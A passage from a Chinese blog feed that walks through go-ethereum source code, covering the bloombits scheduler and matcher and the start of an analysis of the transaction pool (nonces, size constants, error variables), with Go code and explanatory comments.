unique &#123;</span><br><span class="line"><span class="comment">//如果对应的请求为空，但是还没有在其他协程结束，那么把结果分发出去</span></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-quit:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> dist &lt;- &amp;request&#123;bit: s.bit, section: section&#125;:</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果还没有结束，那么给 pend 赋值，pend 进入阻塞状态。</span></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-quit:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> pend &lt;- section:</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着，<code>scheduleDeliveries</code> 方法接收表示段高度的 <code>pend</code>，然后被 <code>response[section].done</code> 阻塞，直到外部调用 <code>deliver</code> 方法。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// scheduleDeliveries reads section acceptance notifications and waits for them</span></span><br><span class="line"><span class="comment">// to be delivered, pushing them into the output data buffer.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *scheduler)</span></span> scheduleDeliveries(pend <span class="keyword">chan</span> <span class="type">uint64</span>, done <span class="keyword">chan</span> []<span class="type">byte</span>, quit <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;, wg *sync.WaitGroup) &#123;</span><br><span class="line"><span class="comment">// Clean up the goroutine and pipeline when done</span></span><br><span class="line"><span class="keyword">defer</span> wg.Done()</span><br><span class="line"><span class="keyword">defer</span> <span class="built_in">close</span>(done)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Keep reading notifications and scheduling deliveries</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-quit:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="comment">//结束 pend 的阻塞</span></span><br><span class="line"><span class="keyword">case</span> idx, ok := &lt;-pend:</span><br><span class="line"><span class="comment">//如果没有收到退出信号，那么将每段的缓存写入 res，并且标注这一段的检索已经完成，</span></span><br><span class="line"><span class="comment">//接着将缓存传递给 done，done 会被阻塞，直到后面的 deliver 执行。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// New section retrieval pending</span></span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Wait until the request is honoured</span></span><br><span class="line">s.lock.Lock()</span><br><span class="line">res := s.responses[idx] <span class="comment">//写入 response，非常关键的一步。</span></span><br><span class="line">s.lock.Unlock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-quit:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> &lt;-res.done: <span class="comment">//这个为了阻塞，指代外部传入值才能解除阻塞</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Deliver the result</span></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-quit:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> done &lt;- res.cached: <span class="comment">//如果没有结束，将缓存的写入 done</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="核心逻辑">核心逻辑</h4><p>最后的 <code>deliver</code> 函数的参数 <code>data</code> 可以看作是 <code>[sections][]byte</code>，用二维数组表示这次调度的每一段对应的结果。当外部的匹配器完成了工作，就会传入 <code>data</code>，给每一段的 <code>response</code> 的结果赋值，也就是给 <code>cached</code> 赋值。这样解除了 <code>scheduleDeliveries</code> 的阻塞，将结果顺利的赋值给 <code>done</code>，执行调度任务的 <code>run</code> 方法也可以顺利的将结果从 <code>done chan []byte</code> 传出</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// deliver is called by the request distributor when a reply to a request arrives.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *scheduler)</span></span> deliver(sections []<span class="type">uint64</span>, data [][]<span class="type">byte</span>) &#123;</span><br><span class="line">s.lock.Lock()</span><br><span class="line"><span class="keyword">defer</span> s.lock.Unlock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, section := <span class="keyword">range</span> sections &#123;</span><br><span class="line"><span class="keyword">if</span> res := s.responses[section]; res != <span class="literal">nil</span> &amp;&amp; res.cached == <span class="literal">nil</span> &#123; <span class="comment">// Avoid non-requests and double deliveries</span></span><br><span class="line">res.cached = data[i]</span><br><span class="line"><span class="built_in">close</span>(res.done)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>流程如下：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">                +-----------+         +-----------+</span><br><span class="line">                | scheduler |  pend   | scheduler |</span><br><span class="line">reqs chan   --&gt; | routine1  | ------&gt; |  routine2 | --&gt; done chan</span><br><span class="line">                +-----------+         +-----------+</span><br><span class="line">                       |                 ^</span><br><span class="line">                       | dist chan       | response</span><br><span class="line">                       |                 |</span><br><span class="line">                    +--v-------------------+</span><br><span class="line">                    |   outside handler    |</span><br><span class="line">                    +----------------------+</span><br></pre></td></tr></table></figure><h3 id="core-bloombits-matcher-go"><code>core/bloombits/matcher.go</code></h3><p>布隆过滤器的匹配器用于完成实际上的匹配工作。</p><h4 id="获取搜索的位置">获取搜索的位置</h4><p>因为每添加一个元素，都会通过哈希函数得到三个位置，将它们的值置为 1。因此，匹配前首先需要找到这三个位置。至于如何确定位置，可以先了解布隆过滤器如何生成的，参考 <code>core/types/bloom9.go</code> 里面的 <code>bloomValues</code> 方法。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bloomIndexes represents the bit indexes inside the bloom filter that belong</span></span><br><span class="line"><span class="comment">// to some key.</span></span><br><span class="line"><span class="keyword">type</span> bloomIndexes [<span class="number">3</span>]<span class="type">uint</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// calcBloomIndexes returns the bloom filter bit indexes belonging to the given key.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">calcBloomIndexes</span><span class="params">(b []<span class="type">byte</span>)</span></span> bloomIndexes &#123;</span><br><span class="line">   b = crypto.Keccak256(b)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> idxs bloomIndexes</span><br><span class="line">   <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(idxs); i++ &#123;</span><br><span class="line">      idxs[i] = (<span class="type">uint</span>(b[<span class="number">2</span>*i])&lt;&lt;<span class="number">8</span>)&amp;<span class="number">2047</span> + <span class="type">uint</span>(b[<span class="number">2</span>*i+<span class="number">1</span>])</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> idxs</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="中间过程的数据结构">中间过程的数据结构</h4><p><code>partialMatches</code> 表示部分匹配的结果。因为一次过滤可能不止一个条件，我们假设有三个条件 A, B, C，对单个条件的匹配叫做子匹配或者部分匹配。其中，<code>bitset</code> 表示这对单个条件的匹配结果的向量，它会在后面通过和其他条件的 <code>bitset</code> 取与，达到同时满足多个条件的效果</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// partialMatches with a non-nil vector represents a section in which some sub-</span></span><br><span class="line"><span class="comment">// matchers have already found potential matches. Subsequent sub-matchers will</span></span><br><span class="line"><span class="comment">// binary AND their matches with this vector. If vector is nil, it represents a</span></span><br><span class="line"><span class="comment">// section to be processed by the first sub-matcher.</span></span><br><span class="line"><span class="keyword">type</span> partialMatches <span class="keyword">struct</span> &#123;</span><br><span class="line">   section <span class="type">uint64</span></span><br><span class="line">   bitset  []<span class="type">byte</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Retrieval</code> 表示一次检索任务 <code>Bit</code> 表示检索第几位，<code>Bitsets</code> 表示 Sections 中每个检索结果向量<br>构成的矩阵。<code>Retrieval</code> 在后面还会被当作传递向 eth 协议中传递数据的中间数据结构。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Retrieval represents a request for retrieval task assignments for a given</span></span><br><span class="line"><span class="comment">// bit with the given number of fetch elements, or a response for such a request.</span></span><br><span class="line"><span class="comment">// It can also have the actual results set to be used as a delivery data struct.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// The contest and error fields are used by the light client to terminate matching</span></span><br><span class="line"><span class="comment">// early if an error is encountered on some path of the pipeline.</span></span><br><span class="line"><span class="keyword">type</span> Retrieval <span class="keyword">struct</span> &#123;</span><br><span class="line">   Bit      <span class="type">uint</span></span><br><span class="line">   Sections []<span class="type">uint64</span></span><br><span class="line">   Bitsets  [][]<span class="type">byte</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//用于 eth 协议终止过滤的匹配操作</span></span><br><span class="line">   Context context.Context</span><br><span class="line">   Error   <span class="type">error</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Matcher</code> 是核心数据结构，它流水线作业，调度实际的检索任务。和 <code>scheduler</code> 的区别在于，<code>scheduler</code> 是任务-请求-结果的宏观的调度器，而 <code>Matcher</code> 是接收已经分配好的请求任务，然后计算检索位置，检索后返回结果。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Matcher is a pipelined system of schedulers and logic matchers which perform</span></span><br><span class="line"><span class="comment">// binary AND/OR operations on the bit-streams, creating a stream of potential</span></span><br><span class="line"><span class="comment">// blocks to inspect for data content.</span></span><br><span class="line"><span class="keyword">type</span> Matcher <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">//段的大小，默认 4096 个区块</span></span><br><span class="line">sectionSize <span class="type">uint64</span> <span class="comment">// Size of the data batches to filter on</span></span><br><span class="line"></span><br><span class="line">filters [][]bloomIndexes <span class="comment">// Filter the system is matching for</span></span><br><span class="line"><span class="comment">//一次匹配工作包括多个调度器，因为调度器是按照一个位检索的，一次匹配至少检索 3 个位</span></span><br><span class="line">schedulers <span class="keyword">map</span>[<span class="type">uint</span>]*scheduler <span class="comment">// Retrieval schedulers for loading bloom bits</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//当需要检索的位置分配好了后，传递检索任务</span></span><br><span class="line">retrievers <span class="keyword">chan</span> <span class="keyword">chan</span> <span class="type">uint</span> <span class="comment">// Retriever processes waiting for bit allocations</span></span><br><span class="line"><span class="comment">//当一次检索任务完成时，传递当前完成的任务数量</span></span><br><span class="line">counters <span class="keyword">chan</span> <span class="keyword">chan</span> <span class="type">uint</span> <span class="comment">// Retriever processes waiting for task count reports</span></span><br><span class="line"><span class="comment">//当检索任务分配好后，传递检索任务</span></span><br><span class="line">retrievals <span class="keyword">chan</span> <span class="keyword">chan</span> *Retrieval <span class="comment">// Retriever processes waiting for task allocations</span></span><br><span class="line"><span class="comment">//当检索完成后，传递任务的结果 response</span></span><br><span class="line">deliveries <span class="keyword">chan</span> *Retrieval <span class="comment">// Retriever processes waiting for task response deliveries</span></span><br><span class="line"></span><br><span class="line">running <span class="type">uint32</span> <span class="comment">// Atomic flag whether a session is live or not</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考">参考</h2><ul><li><a href="https://ethereum.stackexchange.com/questions/3418/how-does-ethereum-make-use-of-bloom-filters">How does Ethereum make use of bloom filters?</a></li><li><a href="https://zh.wikipedia.org/wiki/%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8">维基百科：布隆过滤器</a></li><li><a href="https://gitcode.net/mirrors/Billy1900/Ethereum-tutorial/-/blob/master/core-bloombits%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.md">core-bloombits 源码分析</a></li><li><a href="https://knarfeh.com/2018/03/10/go-ethereum%20%E6%BA%90%E7%A0%81%E7%AC%94%E8%AE%B0%EF%BC%88core,%20eth%20%E6%A8%A1%E5%9D%97-%E9%93%BE%E7%9A%84%E7%B4%A2%E5%BC%95%EF%BC%8C%E6%90%9C%E7%B4%A2%EF%BC%89/">core, eth 模块-链的索引，搜索</a></li><li><a href="https://github.com/laizy/ethereum-review/blob/master/core/bloombits%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.md">bloombits 源码分析.md</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/geth/tx-signature/&quot; title=&quot;交易的签名&quot;&gt;交易的签名&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-receipt/&quot; title=&quot;理解收据receipt&quot;&gt;理解收据receipt&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blocks/&quot; title=&quot;理解区块&quot;&gt;理解区块&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-tx/&quot; title=&quot;理解交易&quot;&gt;理解交易&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blockchain-core/&quot; title=&quot;blockchain核心&quot;&gt;blockchain核心&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/forkId/&quot; title=&quot;forkId 解读&quot;&gt;forkId 解读&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/bloom-filter/&quot; title=&quot;布隆过滤器原理&quot;&gt;布隆过滤器原理&lt;/a&gt;&lt;</summary>
        
      
    
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/categories/geth/"/>
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/tags/geth/"/>
    
  </entry>
  
  <entry>
    <title>交易池分析</title>
    <link href="https://www.blog-blockchain.xyz/geth/tx-pool/"/>
    <id>https://www.blog-blockchain.xyz/geth/tx-pool/</id>
    <published>2022-08-25T03:30:33.000Z</published>
    <updated>2024-11-15T14:30:54.924Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/geth/tx-signature/" title="交易的签名">交易的签名</a></li><li><a href="/geth/understand-receipt/" title="理解收据receipt">理解收据receipt</a></li><li><a href="/geth/blocks/" title="理解区块">理解区块</a></li><li><a href="/geth/understand-tx/" title="理解交易">理解交易</a></li><li><a href="/geth/blockchain-core/" title="blockchain核心">blockchain核心</a></li><li><a href="/geth/forkId/" title="forkId 解读">forkId 解读</a></li><li><a href="/geth/bloom-filter/" title="布隆过滤器原理">布隆过滤器原理</a></li><li><a href="/geth/tx-pool/" title="交易池分析">交易池分析</a></li><li><a href="/geth/oracle-introduction/" title="oracle 原理和实现">oracle 原理和实现</a></li><li><a href="/geth/txlist/" title="TxList 解读">TxList 解读</a></li><li><a href="/geth/MPT-Tree/" title="MPT树">MPT树</a></li><li><a href="/geth/block-sync/" title="区块同步">区块同步</a></li><li><a href="/geth/introduction/" title="geth源码学习——介绍">geth源码学习——介绍</a></li><li><a href="/geth/Geth-Unveiled-Ethereum-Startup/" title="How Geth starts its server">How Geth starts its server</a></li></ol></blockquote><p><strong><code>core\txpool.go</code></strong></p><h3 id="前言">前言</h3><blockquote><ul><li>这篇文章是博主的朋友写的。</li><li>在写这篇文章的时候，笔者已经完完全全看完该代码文件的每一行代码，但是由于代码量过于庞大，所以自然存在边看边忘的情况，所以在此写下这篇文章记录自己的理解以及收获，笔者能力有限，错误之处在所难免，还望包容</li><li>由于该文件代码量过大，而且笔者还同时在看该仓库其他的代码文件，所以笔者决定分期写，一边阅读其他的源码文件，一边回顾<code>txPool.go</code>同时写下阅读笔记</li><li>而且大部分的理解已经记录在源码文件中了，所以阅读源码中的笔记更能帮助理解</li></ul></blockquote><h3 id="一些重要概念">一些重要概念</h3><ol><li><code>可执行交易和非可执行交易</code>。<code>可执行交易</code>是指从交易池中择优选出的一部分交易可以被执行，打包到区块中。<code>非可执行交易</code>则相反，任何刚进入交易池的交易均属于非可执行状态，在某一个时刻才会提升为可执行状态。</li></ol><hr><ol start="2"><li><code>本地交易</code> 在交易池中将交易标记为 local 的有多种用途：<ol><li>在本地磁盘存储已发送的交易。这样，本地交易不会丢失，重启节点时可以重新加载到交易池，实时广播出去。</li><li>可以作为外部程序和以太坊沟通的一个渠道。外部程序只需要监听文件内容变化，则可以获得交易清单。</li><li><code>local交易</code>可优先于 <code>remote 交易</code>。对交易量的限制等操作，不影响 <code>local</code> 下的账户和交易。</li></ol></li></ol><hr><ol start="3"><li><code>nonce</code>总结:<ol><li>以太坊中有两种<code>nonce</code>，一种是在<code>区块中的nonce</code>，主要是调整挖矿难度；一种是每笔<code>交易中nonce</code>。</li><li>每个外部账户（私钥控制的账户）都有一个<code>nonce</code>值，从 0 开始连续累加，每累加一次，代表一笔交易。</li><li>某一地址的某一交易的<code>nonce</code>值如果大于当前的<code>nonce</code>，该交易会被放到交易池的<code>queue</code>列表中，直到缺失的<code>nonce</code>被提交到交易池中。</li><li>地址的<code>nonce</code>值是一个连续的整数，起设计的主要目的是防止双花。</li><li>在发生一笔交易时，如果不指定<code>nonce</code>值时，节点会根据当前交易池的交易自动计算该笔交易的<code>nonce</code>。有可能会出现节点 A 和节点 B 计算的<code>nonce</code>值不一样的情况。</li></ol></li></ol><hr><ol start="4"><li><p>时隙 (<code>slots</code>) 和时段 (<code>epochs</code>)</p><ol><li><p>信标链是以太坊 2.0 的心脏，它令以太坊系统在和谐与共识中有序运行。每个 slot 为 12 秒，每个 epoch 由 32 个 slots 组成，即 6.4 分钟。</p></li><li><p>Epoch 0 中的前 32 个 slots，创世区块在 Slot 0 中产生</p></li><li><p>在每个 slot 中，在信标链和分片中都可能新增一个区块。我们可以想象，信标链和分片链有序且紧密地排列在一起，当系统在理想情况下运转时，每 12 秒就有一个信标（链）区块和 64 个分片区块产生。验证者大致按照这个时间同步。</p></li><li><p>我们可以将一个 slot 看作是区块生成时间，不同的是 slots 内可以没有区块。信标链和分片的创世区块都在 Slot 0 中产生。分片将在信标链 epoch 0 的下一个 epoch 中开始运作，但无论是分片链还是信标链，都有自己的 epoch 0，且包含其创世区块。</p></li></ol></li></ol><hr><h3 id="一些-go-语言的奇妙用法">一些 go 语言的奇妙用法</h3><ol><li><p><code>...</code>其实是 go 的一种语法糖。第一个用法主要是用于函数有多个不定参数的情况，可以接受多个不确定数量的参数。第二个用法是 slice 可以被打散进行传递。</p><p>这个是一个关于该语法的一篇博客可以参考： <a href="https://blog.csdn.net/jeffrey11223/article/details/79166724">Go 中…的用法</a></p></li></ol><hr><ol start="2"><li><code>Go语言等待组（sync.WaitGroup）</code>对于我来说是一个几乎不曾见过的 go 语言的语法知识，所以在此进行查找记录一下，个人理解：该等待组在本 go 语言程序中的作用是调用<code>wg.Wait()</code>时阻塞使得等在组里面的所有的 go 协程都运行完毕，然后才恢复，也是一种同步携程的方法。具体请看这篇文章：<a href="https://zhuanlan.zhihu.com/p/81987971">sync 包——WaitGroup</a></li></ol><hr><h3 id="关于交易中的nonce的深入剖析">关于交易中的<code>nonce</code>的深入剖析:</h3><p><em>参考文章:</em> 1. <a href="https://blog.csdn.net/noding2001/article/details/104051284">一文讲清楚以太坊的 nonce</a> 2. <a href="https://www.jianshu.com/p/6df7f2adc424">以太坊交易中的 Nonce 详解</a></p><hr><h3 id="交易池源码解析-core-txpool-go">交易池源码解析 (<code>core/txpool.go</code>)</h3><h4 id="前提参数">前提参数</h4><blockquote><p>我们可以通过源码看到前面定义了一大堆参数，初看时毫无头绪，但是等你将&gt;这两千行代码完整的看完之时，你基本上就可以理解大部分参数的含义了</p></blockquote><ul><li>以下的这些参数我还不理解，等会补充：</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line"><span class="comment">// chainHeadChanSize is the size of channel listening to ChainHeadEvent.</span></span><br><span class="line">chainHeadChanSize = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// txSlotSize is used to calculate how many data slots a single transaction</span></span><br><span class="line"><span class="comment">// takes up based on its size. The slots are used as DoS protection, ensuring</span></span><br><span class="line"><span class="comment">// that validating a new transaction remains a constant operation (in reality</span></span><br><span class="line"><span class="comment">// O(maxslots), where max slots are 4 currently).</span></span><br><span class="line">txSlotSize = <span class="number">32</span> * <span class="number">1024</span><span class="comment">//32KB</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// txMaxSize is the maximum size a single transaction can have. This field has</span></span><br><span class="line"><span class="comment">// non-trivial consequences: larger transactions are significantly harder and</span></span><br><span class="line"><span class="comment">// more expensive to propagate; larger transactions also take more resources</span></span><br><span class="line"><span class="comment">// to validate whether they fit into the pool or not.</span></span><br><span class="line">txMaxSize = <span class="number">4</span> * txSlotSize <span class="comment">// 128KB</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li>一些错误处理的<code>error</code>变量</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line"><span class="comment">// ErrAlreadyKnown is returned if the transactions is already contained</span></span><br><span class="line"><span class="comment">// within the pool.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//交易池中已经存在的 错误处理</span></span><br><span class="line">ErrAlreadyKnown = errors.New(<span class="string">&quot;already known&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ErrInvalidSender is returned if the transaction contains an invalid signature.</span></span><br><span class="line"><span class="comment">//无效签名的 错误处理</span></span><br><span class="line">ErrInvalidSender = errors.New(<span class="string">&quot;invalid sender&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ErrUnderpriced is returned if a transaction&#x27;s gas price is below the minimum</span></span><br><span class="line"><span class="comment">// configured for the transaction pool.</span></span><br><span class="line"><span class="comment">//定价过低</span></span><br><span class="line">ErrUnderpriced = errors.New(<span class="string">&quot;transaction underpriced&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ErrTxPoolOverflow is returned if the transaction pool is full and can&#x27;t accpet</span></span><br><span class="line"><span class="comment">// another remote transaction.</span></span><br><span class="line"><span class="comment">//交易池已经满了</span></span><br><span class="line">ErrTxPoolOverflow = errors.New(<span class="string">&quot;txpool is full&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ErrReplaceUnderpriced is returned if a transaction is attempted to be replaced</span></span><br><span class="line"><span class="comment">// with a different one without the required price bump.</span></span><br><span class="line">ErrReplaceUnderpriced = errors.New(<span class="string">&quot;replacement transaction underpriced&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ErrGasLimit is returned if a transaction&#x27;s requested gas limit exceeds the</span></span><br><span class="line"><span class="comment">// maximum allowance of the current block.</span></span><br><span class="line">ErrGasLimit = errors.New(<span class="string">&quot;exceeds block gas limit&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ErrNegativeValue is a sanity error to ensure no one is able to specify a</span></span><br><span class="line"><span class="comment">// transaction with a negative value.</span></span><br><span class="line">ErrNegativeValue = errors.New(<span class="string">&quot;negative value&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ErrOversizedData is returned if the input data of a transaction is greater</span></span><br><span class="line"><span class="comment">// than some meaningful limit a user might use. This is not a consensus error</span></span><br><span class="line"><span class="comment">// making the transaction invalid, rather a DOS protection.</span></span><br><span class="line">ErrOversizedData = errors.New(<span class="string">&quot;oversized data&quot;</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li>度量参数(或者说是计数器)</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line"><span class="comment">// Metrics for the pending pool</span></span><br><span class="line"><span class="comment">//待处理池</span></span><br><span class="line">pendingDiscardMeter   = metrics.NewRegisteredMeter(<span class="string">&quot;txpool/pending/discard&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">pendingReplaceMeter   = metrics.NewRegisteredMeter(<span class="string">&quot;txpool/pending/replace&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">pendingRateLimitMeter = metrics.NewRegisteredMeter(<span class="string">&quot;txpool/pending/ratelimit&quot;</span>, <span class="literal">nil</span>) <span class="comment">// Dropped due to rate limiting</span></span><br><span class="line">pendingNofundsMeter   = metrics.NewRegisteredMeter(<span 